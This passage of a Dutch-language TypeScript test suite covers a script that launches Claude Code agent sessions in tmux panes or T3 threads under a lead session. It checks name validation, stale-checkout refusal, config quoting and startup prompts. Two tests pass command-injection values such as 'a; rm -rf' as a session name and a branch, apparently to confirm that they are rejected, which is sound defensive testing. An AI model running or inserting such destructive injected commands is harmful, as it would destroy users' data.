    expect(r.fout).toContain("vertrouwensvraag in pane %7 niet beantwoord binnen 1s");
    expect(r.fout).toContain("Je lead is l. Jij bent sessie w1.");
    expect(log("tmux.log")).not.toContain("send-keys");
  });

  test("een andere vraag ('Do you want') is geen vertrouwensvraag", () => {
    writeFileSync(join(dir, "pane.txt"), "Do you want to proceed?\n❯ 1. Yes\n");
    const r = draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--lead", "l", "--map", dir], basis());
    expect(r.fout).not.toMatch(/vertrouw/);
    expect(r.fout).toMatch(/niet klaar voor invoer/);
  });

  test("een gevulde invoerregel telt niet als klaar; alleen een lege invoerbox", () => {
    writeFileSync(join(dir, "pane.txt"), "❯ 1. Yes\n");
    const r = draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--lead", "l", "--map", dir], basis());
    expect(r.fout).toMatch(/niet klaar voor invoer/);
  });

  test("weigert een naam met spaties of shell-tekens", () => {
    const r = draai(SPAWN, ["--naam", "a; rm -rf", "--opdracht", opdracht(), "--lead", "l"], basis());
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/mag alleen/);
  });

  test("--droog toont wat er gebeurt en start niets", () => {
    const r = draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--lead", "lead-x", "--model", "opus", "--droog"], basis());
    expect(r.code).toBe(0);
    expect(r.uit).toContain('window');
    expect(r.uit).toContain("claude -n w1 --model opus");
    expect(r.uit).toContain("Je lead is lead-x. Jij bent sessie w1.");
    expect(log("spawn.log")).toBe("");
    expect(log("tmux.log")).toBe("");
  });

  test("de peers-MCP gaat per Claude-spawn mee als --mcp-config met naam, lead en staat, nooit globaal", () => {
    const server = join(dir, "server.ts");
    writeFileSync(server, "// nep\n");
    const staat = join(dir, "staat");
    const r = draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--lead", "lead-x", "--droog"], basis({ LAB_PEERS_SERVER: server, LAB_LEAD_STAAT: staat }));
    expect(r.code).toBe(0);
    const m = r.uit.match(/--mcp-config '([^']+)' --allowedTools=mcp__peers/);
    expect(m).not.toBeNull();
    const cfg = JSON.parse(m![1]);
    expect(cfg.mcpServers.peers.args).toEqual([server]);
    expect(cfg.mcpServers.peers.command).toMatch(/bun$/);
    expect(cfg.mcpServers.peers.env).toEqual({ LAB_AGENT_NAAM: "w1", LAB_LEAD_NAAM: "lead-x", LAB_LEAD_STAAT: staat });
    const zonder = draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--lead", "lead-x", "--droog"], basis({ LAB_PEERS_SERVER: join(dir, "bestaat-niet.ts") }));
    expect(zonder.code).toBe(0);
    expect(zonder.fout).toMatch(/peers-MCP .* ontbreekt/);
    expect(zonder.uit).not.toContain("--mcp-config");
    // Het hele commando blijft één geldige shellregel (tmux draait het met sh -c).
    const cmd = r.uit.match(/ window \S+ "(.*)"$/m)![1];
    expect(Bun.spawnSync(["sh", "-n", "-c", cmd]).exitCode).toBe(0);
    // Zonder LAB_LEAD_STAAT geen sleutel; een quote in het serverpad geeft geen vlag (nooit uit de quotes breken).
    const geenStaat = draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--lead", "lead-x", "--droog"], basis({ LAB_PEERS_SERVER: server, LAB_LEAD_STAAT: "", HOME: dir })); // HOME in de wegwerpmap: de standaard-staat is niet het echte register
    expect(JSON.parse(geenStaat.uit.match(/--mcp-config '([^']+)'/)![1]).mcpServers.peers.env).toEqual({ LAB_AGENT_NAAM: "w1", LAB_LEAD_NAAM: "lead-x" });
    const quote = join(dir, "q'uote.ts");
    writeFileSync(quote, "// nep\n");
    const metQuote = draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--lead", "lead-x", "--droog"], basis({ LAB_PEERS_SERVER: quote }));
    expect(metQuote.fout).toMatch(/quote of backslash/);
    expect(metQuote.uit).not.toContain("--mcp-config");
  });

  const leadRecord = (id: string, naam: string, pane: string, toestand = "bezig") => {
    mkdirSync(join(dir, "staat", "register"), { recursive: true });
    const r = { id, soort: "sessie", naam, rol: "lead", lead: "", pane, toestand, sinds: 1, start: 1 };
    writeFileSync(join(dir, "staat", "register", `${id}.json`), JSON.stringify(r));
  };

  test("weigert een dubbele leadnaam (twee levende leads, aanroeper onbekend)", () => {
    writeFileSync(join(dir, "panes.txt"), "%1\n%2\n");
    leadRecord("aaaa1111", "lead", "%1");
    leadRecord("bbbb2222", "lead", "%2");
    const r = draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--lead", "lead", "--droog"], basis());
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/geef --lead <unieke naam>|Geef --lead <unieke naam>/);
    expect(log("spawn.log")).toBe("");
  });

  test("dubbele naam met herkende aanroeper (TMUX_PANE) weigert; een weg-record of dode pane telt niet", () => {
    writeFileSync(join(dir, "panes.txt"), "%1\n%2\n");
    leadRecord("aaaa1111", "lead", "%1");
    leadRecord("bbbb2222", "lead", "%2");
    const args = ["--naam", "w1", "--opdracht", opdracht(), "--droog"];
    // zonder --lead: de naam komt uit het register van pane %1 (en is dubbel)
    const r = draai(SPAWN, args, basis({ TMUX_PANE: "%1" }));
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/unieke naam/);
    leadRecord("bbbb2222", "lead", "%2", "weg");
    const ok = draai(SPAWN, args, basis({ TMUX_PANE: "%1" }));
    expect(ok.fout).toBe("");
    expect(ok.uit).toContain("LAB_LEAD_NAAM=lead ");
    leadRecord("bbbb2222", "lead", "%2");
    writeFileSync(join(dir, "panes.txt"), "%1\n"); // pane %2 bestaat niet meer
    expect(draai(SPAWN, args, basis({ TMUX_PANE: "%1" })).code).toBe(0);
  });

  describe("checkout achter op origin/main", () => {
    const args = () => ["--naam", "w1", "--opdracht", opdracht(), "--lead", "l", "--droog"];
    // Een tweede clone zet een commit op origin/main (in `pad`), zoals een gemergde PR terwijl de checkout van de lead stilstaat.
    const mergeOpMain = (pad: string) => {
      const clone = join(dir, "andere-clone");
      git(dir, "clone", "-q", "-b", "main", origin, clone);
      mkdirSync(join(clone, dirname(pad)), { recursive: true });
      writeFileSync(join(clone, pad), "nieuw\n");
      git(clone, "add", "-A");
      git(clone, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "merge");
      expect(git(clone, "push", "-q", "origin", "HEAD:main").exitCode).toBe(0);
    };

    test("gelijk met origin/main: door, zonder melding (ook zonder fetch-resultaat)", () => {
      const r = draai(SPAWN, args(), basis());
      expect([r.code, r.fout]).toEqual([0, ""]);
    });

    test("achter in scripts/lead/: weigert (ook --droog en --vendor codex), met pull --ff-only voor die checkout", () => {
      mergeOpMain("scripts/lead/nieuw.sh");
      for (const extra of [[], ["--vendor", "codex"]]) {
        const r = draai(SPAWN, [...args(), ...extra], basis());
        expect(r.code).toBe(1);
        expect(r.fout).toMatch(/^spawn: scripts\/lead\/ in .* loopt 1 commit\(s\) achter op origin\/main/);
        expect(r.fout).toContain(`git -C ${realpathSync(repo)} pull --ff-only`);
      }
      expect(log("spawn.log")).toBe("");
      // na de pull weer door
      expect(git(repo, "pull", "-q", "--ff-only", "origin", "main").exitCode).toBe(0);
      expect(draai(SPAWN, args(), basis()).code).toBe(0);
    });

    test("achter buiten scripts/lead/: door; een tak die vooruit loopt in scripts/lead/ ook", () => {
      mergeOpMain("apps/x/y.ts");
      expect(draai(SPAWN, args(), basis()).code).toBe(0);
      mkdirSync(join(repo, "scripts/lead"), { recursive: true });
      writeFileSync(join(repo, "scripts/lead/lokaal.sh"), "x\n");
      git(repo, "add", "-A");
      git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "lokaal");
      expect(draai(SPAWN, args(), basis()).code).toBe(0);
    });

    test("LAB_SPAWN_NIET_ACTUEEL_OK=1 laat achterlopen toe met een waarschuwing", () => {
      mergeOpMain("scripts/lead/nieuw.sh");
      const r = draai(SPAWN, args(), basis({ LAB_SPAWN_NIET_ACTUEEL_OK: "1" }));
      expect(r.code).toBe(0);
      expect(r.fout).toMatch(/waarschuwing: scripts\/lead\/ .* achter op origin\/main; doorgaan op LAB_SPAWN_NIET_ACTUEEL_OK=1/);
    });

    test("fetch mislukt: waarschuwing en vergelijking met de lokale origin/main (achter blijft geweigerd)", () => {
      mergeOpMain("scripts/lead/nieuw.sh");
      expect(git(repo, "fetch", "-q", "origin", "main").exitCode).toBe(0);
      git(repo, "remote", "set-url", "origin", join(dir, "bestaat-niet.git"));
      const r = draai(SPAWN, args(), basis());
      expect(r.code).toBe(1);
      expect(r.fout).toMatch(/waarschuwing: ophalen van origin\/main mislukte/);
      expect(r.fout).toMatch(/achter op origin\/main/);
    });

    test("een hangende fetch stopt na LAB_SPAWN_FETCH_S: git zelf is weg (geen wees), spawn gaat door met een waarschuwing", () => {
      // Nep-ssh op PATH (GIT_SSH_COMMAND='ssh -oBatchMode=yes'): noteert zichzelf en zijn argumenten, en hangt.
      // Geen $PPID als pid van git: op Linux zit er een `sh -c` (dash, zonder exec) tussen git en ssh.
      const pids = join(dir, "ssh-pids");
      schrijfBin("ssh", `#!/bin/sh\necho "$$ $*" > ${pids}\nexec sleep 30\n`);
      git(repo, "remote", "set-url", "origin", "ssh://hangt.invalid/x.git");
      const r = draai(SPAWN, args(), basis({ LAB_SPAWN_FETCH_S: "1" }));
      const [sshPid, ...sshArgs] = readFileSync(pids, "utf8").trim().split(" ");
      try {
        expect(r.code).toBe(0);
        expect(r.fout).toMatch(/waarschuwing: ophalen van origin\/main mislukte \(exit 143\)/);
        expect(sshArgs).toContain("-oBatchMode=yes");
        // git zelf (met -C <deze wegwerp-repo> fetch) draait niet meer
        const nog = Bun.spawnSync(["ps", "-eo", "args"]).stdout.toString().split("\n").filter((l) => l.startsWith("git ") && l.includes(` -C ${repo} fetch`));
        expect(nog).toEqual([]);
      } finally {
        try {
          process.kill(Number(sshPid));
        } catch {
          // al weg
        }
      }
    });

    test("--meerdere: de ouder toetst eenmaal, de kinderen niet", () => {
      mergeOpMain("scripts/lead/nieuw.sh");
      writeFileSync(join(dir, "lijst.txt"), `w1 ${opdracht()}\nw2 ${opdracht()}\n`);
      const r = draai(SPAWN, ["--meerdere", join(dir, "lijst.txt"), "--lead", "l", "--droog"], basis({ LAB_SPAWN_NIET_ACTUEEL_OK: "1" }));
      expect(r.fout.match(/doorgaan op LAB_SPAWN_NIET_ACTUEEL_OK=1/g)?.length).toBe(1);
      // een LAB_SPAWN_ACTUEEL_GETOETST van buiten (niet de ouder) slaat de toets niet over
      const zelf = draai(SPAWN, args(), basis({ LAB_SPAWN_ACTUEEL_GETOETST: "1" }));
      expect(zelf.code).toBe(1);
    });

    test("geen origin/main of geen repo: waarschuwing en door", () => {
      git(repo, "remote", "remove", "origin");
      const r = draai(SPAWN, args(), basis());
      expect(r.code).toBe(0);
      expect(r.fout).toMatch(/waarschuwing: geen origin\/main/);
      const geen = draai(SPAWN, args(), basis({ LAB_SPAWN_REPO: join(dir, "geen-repo") }));
      expect(geen.code).toBe(0);
      expect(geen.fout).toMatch(/waarschuwing: .* is geen git-repo/);
    });
  });

  test("weigert een --lead die niet in het register staat (met het herstelcommando), toetst niets zonder register", () => {
    writeFileSync(join(dir, "panes.txt"), "%1\n");
    leadRecord("aaaa1111", "lead-a", "%1");
    const args = ["--naam", "w1", "--opdracht", opdracht(), "--droog"];
    const r = draai(SPAWN, [...args, "--lead", "lead-peerbus"], basis());
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/^spawn: lead 'lead-peerbus' staat niet in het register/);
    expect(r.fout).toContain("`lead`");
    expect(r.fout).toContain("LAB_LEAD=1 LAB_AGENT_ROL=lead LAB_AGENT_NAAM=lead-peerbus LAB_LEAD_NAAM=lead-peerbus claude --resume <id> -n lead-peerbus");
    expect(log("spawn.log")).toBe("");
    // ook via LAB_LEAD_NAAM, en voor --sublead (zelfde pad)
    expect(draai(SPAWN, args, basis({ LAB_LEAD_NAAM: "lead-peerbus" })).code).toBe(1);
    expect(draai(SPAWN, [...args, "--sublead", "--lead", "lead-peerbus"], basis()).code).toBe(1);
    // een levende lead met die naam: door; een weg-record of dode pane telt niet
    expect(draai(SPAWN, [...args, "--lead", "lead-a"], basis()).code).toBe(0);
    leadRecord("aaaa1111", "lead-a", "%1", "weg");
    expect(draai(SPAWN, [...args, "--lead", "lead-a"], basis()).code).toBe(1);
    leadRecord("aaaa1111", "lead-a", "%1");
    writeFileSync(join(dir, "panes.txt"), "%9\n");
    expect(draai(SPAWN, [...args, "--lead", "lead-a"], basis()).code).toBe(1);
    // register zonder map (machine zonder peerbus): geen toets
    rmSync(join(dir, "staat"), { recursive: true, force: true });
    expect(draai(SPAWN, [...args, "--lead", "lead-peerbus"], basis()).code).toBe(0);
  });

  test("een mislukte dubbel-controle (andere exit dan 3) geeft een waarschuwing en spawnt toch", () => {
    schrijfBin("stuk-bun", "#!/bin/sh\nexit 7\n");
    const r = draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--lead", "lead", "--droog"], basis({ LAB_LEAD_BUN: join(bin, "stuk-bun") }));
    expect(r.code).toBe(0);
    expect(r.fout).toMatch(/waarschuwing.*exit 7/);
  });

  test("zonder --lead geldt de leadnaam uit het register boven LAB_LEAD_NAAM", () => {
    writeFileSync(join(dir, "panes.txt"), "%1\n");
    leadRecord("aaaa1111", "lead-ruimte", "%1");
    const r = draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--droog"], basis({ TMUX_PANE: "%1", LAB_LEAD_NAAM: "lead" }));
    expect(r.fout).toBe("");
    expect(r.uit).toContain("LAB_LEAD_NAAM=lead-ruimte ");
  });

  test("start, wacht op de prompt, typt de startzin letterlijk en geeft het pane-id", () => {
    writeFileSync(join(dir, "pane.txt"), "Claude Code\n  auto mode on (shift+tab)\n");
    writeFileSync(join(dir, "reageert"), "");
    const map = join(dir, "werkmap");
    mkdirSync(map);
    const r = draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--lead", "lead-x", "--model", "sonnet", "--map", map], basis({ LAB_SPAWN_BEWIJS: "2", LAB_SPAWN_POLS: "1" }));
    expect(r.fout).toBe("");
    expect(r.code).toBe(0);
    expect(r.uit.trim()).toBe("%7");
    expect(log("spawn.log")).toContain("window");
    expect(log("spawn.log")).toContain("claude -n w1 --model sonnet");
    const t = log("tmux.log");
    expect(t).toContain("send-keys -t %7 -l Je lead is lead-x. Jij bent sessie w1. Lees");
    expect(t).toContain("SendMessage (to: lead-x).");
    expect(t).toContain("send-keys -t %7 Enter");
    // de opdracht staat niet in de aangeroepen claude-opdracht (geen prompt in de quotes)
    expect(log("spawn.log")).not.toContain("Je lead is");
  });

  test("het commando krijgt het env-voorvoegsel voor de hooks, per rol; --droog toont het", () => {
    const o = opdracht();
    const zonderId = (t: string) => t.replace(/ LAB_SPAWN_ID=[\w-]+/, "");
    const voor = (rol: string) => `env LAB_AGENT_NAAM=w1 LAB_AGENT_ROL=${rol} LAB_LEAD_NAAM=lead-x LAB_OPDRACHT=${o} claude -n w1`;
    const a = draai(SPAWN, ["--naam", "w1", "--opdracht", o, "--lead", "lead-x", "--droog"], basis());
    expect(zonderId(a.uit)).toContain(`"${voor("agent")}`);
    expect(a.uit).toContain("@agent_rol agent");
    expect(a.uit).toContain("@agent_naam w1");
    const s = draai(SPAWN, ["--naam", "w1", "--opdracht", o, "--lead", "lead-x", "--sublead", "--droog"], basis());
    expect(zonderId(s.uit)).toContain(`"${voor("sublead")}`);
    const v = draai(SPAWN, ["--naam", "w1", "--opdracht", o, "--lead", "lead-x", "--vervolg", "lead/test-tak", "--map", repo, "--droog"], basis());
    expect(zonderId(v.uit)).toContain(`"${voor("vervolg")}`);
    const m = draai(SPAWN, ["--naam", "w1", "--opdracht", o, "--lead", "lead-x", "--model", "opus", "--droog"], basis());
    expect(zonderId(m.uit)).toContain(`${voor("agent")} --model opus`);
  });

  test("een opdrachtpad met spatie staat in het voorvoegsel tussen enkele quotes", () => {
    const spatie = join(dir, "met spatie.md");
    writeFileSync(spatie, "x");
    const r = draai(SPAWN, ["--naam", "w1", "--opdracht", spatie, "--lead", "l", "--droog"], basis());
    expect(r.uit.replace(/ LAB_SPAWN_ID=[\w-]+/, "")).toContain(`LAB_OPDRACHT='${spatie}' claude -n w1`);
  });

  test("het commando bevat een eenmalig LAB_SPAWN_ID, per sessie anders", () => {
    const o = opdracht();
    const id = (n: string) => /LAB_SPAWN_ID=([\w-]+)/.exec(draai(SPAWN, ["--naam", n, "--opdracht", o, "--lead", "l", "--droog"], basis()).uit)?.[1];
    expect(id("w1")).toBeTruthy();
    expect(id("w1")).not.toBe(id("w2"));
  });

  test("zet na het starten @agent_rol en @agent_naam op de pane (nep-tmux)", () => {
    writeFileSync(join(dir, "pane.txt"), "Claude Code\n  auto mode on (shift+tab)\n");
    writeFileSync(join(dir, "reageert"), "");
    const map = join(dir, "werkmap");
    mkdirSync(map);
    const r = draai(SPAWN, ["--naam", "s1", "--opdracht", opdracht(), "--lead", "lead-x", "--sublead", "--map", map], basis({ LAB_SPAWN_BEWIJS: "2", LAB_SPAWN_POLS: "1" }));
    expect(r.code).toBe(0);
    const t = log("tmux.log");
    expect(t).toContain("tmux set -p -t %7 @agent_rol sublead");
    expect(t).toContain("tmux set -p -t %7 @agent_naam s1");
    expect(t.indexOf("@agent_rol")).toBeLessThan(t.indexOf("send-keys"));
    expect(log("spawn.log")).toContain("LAB_AGENT_ROL=sublead");
  });

  test("LAB_LEAD_NAAM geldt als --lead ontbreekt", () => {
    const r = draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--droog"], basis({ LAB_LEAD_NAAM: "uit-env" }));
    expect(r.uit).toContain("Je lead is uit-env.");
  });

  test("meldt het als de sessie niet klaar komt voor invoer en typt niets", () => {
    writeFileSync(join(dir, "pane.txt"), "Loading ...\n");
    const r = draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--lead", "l", "--map", dir], basis());
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/niet klaar voor invoer/);
    expect(log("tmux.log")).not.toContain("send-keys");
  });

  test("--sublead: startzin met de Agent-tool, zonder workflow", () => {
    const r = draai(SPAWN, ["--naam", "s1", "--opdracht", opdracht(), "--lead", "lead-x", "--sublead", "--droog"], basis());
    expect(r.code).toBe(0);
    expect(r.uit).toContain("sub-lead");
    expect(r.uit).toContain("scripts/lead/sublead.md");
    expect(r.uit).toContain("Agent-tool");
    expect(r.uit).toContain("SendMessage (to: lead-x)");
    expect(r.uit).toContain("Geen Workflow-tool.");
    expect(r.uit).not.toContain("workflows");
    expect(r.uit).not.toContain("vaste-cyclus.js");
  });

  test("--sublead --workflow noemt Brians toestemming met de datum; --workflow alleen met --sublead", () => {
    const r = draai(SPAWN, ["--naam", "s1", "--opdracht", opdracht(), "--lead", "l", "--sublead", "--workflow", "2026-10-06", "--droog"], basis());
    expect(r.uit).toContain("Brian gaf op 2026-10-06 toestemming voor workflows (zie ~/vault-b-status/lead.md)");
    expect(r.uit).not.toContain("Geen Workflow-tool.");
    expect(r.uit).toContain("scripts/lead/vaste-cyclus.js");
    const zonder = draai(SPAWN, ["--naam", "s1", "--opdracht", opdracht(), "--lead", "l", "--workflow", "2026-10-06", "--droog"], basis());
    expect(zonder.code).toBe(1);
    expect(zonder.fout).toMatch(/hoort bij --sublead/);
    const slecht = draai(SPAWN, ["--naam", "s1", "--opdracht", opdracht(), "--lead", "l", "--sublead", "--workflow", "gisteren", "--droog"], basis());
    expect(slecht.fout).toMatch(/JJJJ-MM-DD/);
  });

  test("--vervolg: weigert een onbekende tak, typt voor een bestaande tak de vervolg-startzin", () => {
    const geen = draai(SPAWN, ["--naam", "v1", "--opdracht", opdracht(), "--lead", "l", "--vervolg", "lead/bestaat-niet", "--map", repo, "--droog"], basis());
    expect(geen.code).toBe(1);
    expect(geen.fout).toMatch(/tak 'lead\/bestaat-niet' bestaat niet/);
    const r = draai(SPAWN, ["--naam", "v1", "--opdracht", opdracht(), "--lead", "l", "--vervolg", "lead/test-tak", "--map", repo, "--droog"], basis());
    expect(r.code).toBe(0);
    expect(r.uit).toContain("vervolgsessie op tak lead/test-tak");
    expect(r.uit).toContain("git log origin/main..lead/test-tak");
    expect(r.uit).toContain("git diff origin/main...lead/test-tak");
    expect(log("tmux.log")).toBe("");
  });

  test("--vervolg en --sublead sluiten elkaar uit; een tak met shell-tekens wordt geweigerd", () => {
    const a = draai(SPAWN, ["--naam", "v1", "--opdracht", opdracht(), "--lead", "l", "--sublead", "--vervolg", "main", "--map", repo, "--droog"], basis());
    expect(a.fout).toMatch(/sluiten elkaar uit/);
    const b = draai(SPAWN, ["--naam", "v1", "--opdracht", opdracht(), "--lead", "l", "--vervolg", "x; rm -rf", "--map", repo, "--droog"], basis());
    expect(b.fout).toMatch(/mag alleen/);
  });

  test("meldt het als er na de startzin geen tool-aanroep verschijnt", () => {
    writeFileSync(join(dir, "pane.txt"), "❯ \n");
    const r = draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--lead", "l", "--map", dir], basis());
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/geen tool-aanroep/);
    expect(log("tmux.log")).toContain("send-keys -t %7 Enter");
  });

  test("--meerdere: tien sessies in één aanroep, parallel, elk met een eigen pane", () => {
    const o = opdracht();
    const lijst = join(dir, "lijst.txt");
    const namen = Array.from({ length: 10 }, (_, i) => `w${i + 1}`);
    writeFileSync(lijst, `# commentaar\n\n${namen.map((n) => `${n} ${o} sonnet`).join("\n")}\n`);
    writeFileSync(join(dir, "pane.txt"), "❯ \n");
    writeFileSync(join(dir, "reageert"), "");
    const r = draai(SPAWN, ["--meerdere", lijst, "--lead", "l", "--map", dir], basis());
    expect([r.code, r.fout]).toEqual([0, ""]);
    for (const n of namen) expect(r.uit).toContain(`spawn: ${n} gestart: %7`);
    expect(log("spawn.log").split("\n").filter((x) => x.includes("claude -n"))).toHaveLength(10);
  });

  test("--meerdere faalt luid als sessies hun startregel niet kregen, en meldt welke", () => {
    const o = opdracht();
    const lijst = join(dir, "lijst.txt");
    writeFileSync(lijst, `w1 ${o}\nw2 ${o}\n`);
    writeFileSync(join(dir, "pane.txt"), "❯ \n"); // geen "reageert": geen ⏺ na de startzin
    const r = draai(SPAWN, ["--meerdere", lijst, "--lead", "l", "--map", dir], basis());
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/MISLUKT w1 .*geen tool-aanroep/);
    expect(r.fout).toMatch(/MISLUKT w2 .*geen tool-aanroep/);
    expect(r.fout).toMatch(/2 van 2 sessies/);
  });

  test("--meerdere valideert de hele lijst vóór de eerste start: dubbele naam, kapotte regel na een goede", () => {
    const o = opdracht();
    const lijst = join(dir, "lijst.txt");
    const tmp = join(dir, "tmp");
    mkdirSync(tmp);
    const proef = (inhoud: string) => {
      writeFileSync(lijst, inhoud);
      writeFileSync(join(dir, "pane.txt"), "❯ \n");
      return draai(SPAWN, ["--meerdere", lijst, "--lead", "l", "--map", dir], basis({ TMPDIR: tmp }));
    };
    const dubbel = proef(`w1 ${o}\nw2 ${o}\nw1 ${o}\n`);
    expect(dubbel.code).toBe(1);
    expect(dubbel.fout).toMatch(/regel 3: dubbele naam 'w1'; er is nog niets gestart/);
    expect(proef(`w1 ${o}\nw2\n`).fout).toMatch(/regel 2: verwacht 'naam opdrachtbestand/);
    expect(proef(`w1 ${o}\nw2 ${join(dir, "bestaat-niet.md")}\n`).fout).toMatch(/regel 2: opdrachtbestand bestaat niet/);
    expect(proef(`w1 ${o} sonnet\nw2 ${o} gpt\n`).fout).toMatch(/regel 2: model moet sonnet of opus/);
    expect(log("spawn.log")).toBe(""); // niets gestart, ook w1 niet
    expect(readdirSync(tmp)).toEqual([]); // geen temp-map achtergelaten
  });

  test("--meerdere sluit --naam uit en weigert een lege of kapotte lijst", () => {
    const lijst = join(dir, "lijst.txt");
    writeFileSync(lijst, "# leeg\n");
    expect(draai(SPAWN, ["--meerdere", lijst, "--naam", "x", "--lead", "l"], basis()).fout).toMatch(/sluit .* uit/);
    expect(draai(SPAWN, ["--meerdere", lijst, "--lead", "l"], basis()).fout).toMatch(/geen sessies/);
    writeFileSync(lijst, "alleennaam\n");
    expect(draai(SPAWN, ["--meerdere", lijst, "--lead", "l"], basis()).fout).toMatch(/verwacht 'naam opdrachtbestand/);
  });
});

describe("spawn.sh --t3", () => {
  // Nep-t3: logt elke aanroep met de werkmap, onthoudt of het project bestaat, leest de startzin van stdin
  // en geeft voor `thread show` de JSON uit t3-show.json.
  let wt: string;
  const T3 = () => join(bin, "t3");
  const show = (thread: Record<string, unknown>) => writeFileSync(join(dir, "t3-show.json"), JSON.stringify({ thread: { status: "running", itemCount: 3, pendingRequestCount: 0, ...thread }, messages: [] }));
  const opdracht = () => {
    const p = join(dir, "opdracht.md");
    writeFileSync(p, "doe iets\n");
    return p;
  };
  const basis = (extra: Record<string, string> = {}) => ({
    LAB_SPAWN_SCRIPT: join(bin, "nep-agent-spawn.sh"),
    LAB_SPAWN_POLS: "0",
    LAB_SPAWN_WACHT: "0",
    LAB_SPAWN_BEWIJS: "0",
    LAB_LEAD_NAAM: "",
    LAB_CLAUDE_JSON: join(dir, "bestaat-niet.json"),
    LAB_T3: T3(),
    LAB_T3_MODEL: "",
    ...extra,
  });
  const inst = () => join(wt, ".claude", "settings.local.json");
  const t3 = (args: string[], extra: Record<string, string> = {}) => draai(SPAWN, ["--naam", "w1", "--opdracht", opdracht(), "--lead", "lead-x", "--t3", ...args], basis(extra));

  beforeEach(() => {
    schrijfBin(
      "t3",
      `#!/usr/bin/env bash
echo "t3 [$PWD] $*" >> "$FAKE_DIR/t3.log"
case "$1 $2" in
  "thread list") [ -f "$FAKE_DIR/t3-project" ] && exit 0; echo "No T3 Code project matches '.'." >&2; exit 1 ;;
  "project add") touch "$FAKE_DIR/t3-project"; echo "Added project"; exit 0 ;;
  "thread start")
    cat > "$FAKE_DIR/t3-stdin.txt"
    if [ -f "$FAKE_DIR/t3-startfout" ]; then echo "server niet bereikbaar" >&2; exit 1; fi
    if [ -f "$FAKE_DIR/t3-onzin" ]; then echo "Warning: iets"; echo "- - -"; exit 0; fi
    # de echte t3 drukt buiten een terminal alleen het id af, in een terminal met "Thread " ervoor
    if [ -f "$FAKE_DIR/t3-tty" ]; then echo "Thread mcp:1234abcd-0000"; else echo "mcp:1234abcd-0000"; fi
    exit 0 ;;
  "thread show") cat "$FAKE_DIR/t3-show.json" 2>/dev/null; exit 0 ;;
esac
exit 1
`,
    );
    wt = join(dir, "eigen-worktree");
    git(repo, "worktree", "add", "-q", "-b", "werk", wt);
    writeFileSync(join(wt, ".gitignore"), ".claude/settings.local.json\n");
    show({});
  });

  test("weigert de hoofdcheckout, een submap en een niet-genegeerd settings.local.json; schrijft dan niets", () => {
    writeFileSync(join(repo, ".gitignore"), ".claude/settings.local.json\n");
    const hoofd = t3(["--map", repo]);
    expect(hoofd.code).toBe(1);
    expect(hoofd.fout).toMatch(/hoofdcheckout/);
    mkdirSync(join(wt, "sub"));
    expect(t3(["--map", join(wt, "sub")]).fout).toMatch(/wortel van een worktree/);
    rmSync(join(wt, ".gitignore"));
    expect(t3(["--map", wt]).fout).toMatch(/niet git-genegeerd/);
    expect(t3(["--map", dir]).fout).toMatch(/geen git-checkout/);
    expect(existsSync(inst())).toBe(false);
    expect(existsSync(join(repo, ".claude"))).toBe(false);
    expect(log("t3.log")).toBe("");
  });

  test("weigert een checkout met de identiteit van een andere sessie; dezelfde naam mag", () => {
    mkdirSync(join(wt, ".claude"));
    writeFileSync(inst(), JSON.stringify({ env: { LAB_AGENT_NAAM: "ander" } }));
    const r = t3(["--map", wt]);
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/identiteit van sessie 'ander'/);
    expect(log("t3.log")).toBe("");
    writeFileSync(inst(), JSON.stringify({ env: { LAB_AGENT_NAAM: "w1" } }));
    expect(t3(["--map", wt]).code).toBe(0);
    writeFileSync(inst(), "geen json");
    expect(t3(["--map", wt]).fout).toMatch(/geen JSON-object/);
  });

  test("zet de identiteit in settings.local.json, voegt het project toe, start de thread en geeft t3:<id>", () => {
    mkdirSync(join(wt, ".claude"));
    writeFileSync(inst(), JSON.stringify({ permissions: { allow: ["Bash(ls)"] }, env: { FOO: "1", LAB_AGENT_ROL: "oud" } }));
    const r = t3(["--map", wt, "--model", "sonnet"]);
    expect(r.fout).toBe("");
    expect(r.code).toBe(0);
    expect(r.uit.trim().split("\n").at(-1)).toBe("t3:mcp:1234abcd-0000");
    const s = JSON.parse(readFileSync(inst(), "utf8"));
    expect(s.permissions).toEqual({ allow: ["Bash(ls)"] });
    expect(s.env).toMatchObject({ FOO: "1", LAB_AGENT_NAAM: "w1", LAB_AGENT_ROL: "agent", LAB_LEAD_NAAM: "lead-x", LAB_OPDRACHT: join(dir, "opdracht.md") });
    expect(s.env.LAB_SPAWN_ID).toMatch(/^\d+-\d+-\d+$/);
    expect(readdirSync(join(wt, ".claude"))).toEqual(["settings.local.json"]); // geen tijdelijk bestand achtergelaten
    const l = log("t3.log");
    expect(l).toContain(`t3 [${wt}] thread list`);
    expect(l).toContain(`project add --title w1 ${wt}`);
    expect(l).toContain(`thread start --title w1 --provider claudeAgent --model claude-sonnet-5-5 ${wt} -`);
    expect(l).toContain("thread show mcp:1234abcd-0000 --json");
    const zin = readFileSync(join(dir, "t3-stdin.txt"), "utf8");
    expect(zin).toContain("Je lead is lead-x. Jij bent sessie w1. Lees");
    expect(zin).toContain("gebruik geen AskUserQuestion");
    // geen tmux-pad
    expect(log("spawn.log")).toBe("");
    expect(log("tmux.log")).toBe("");
  });

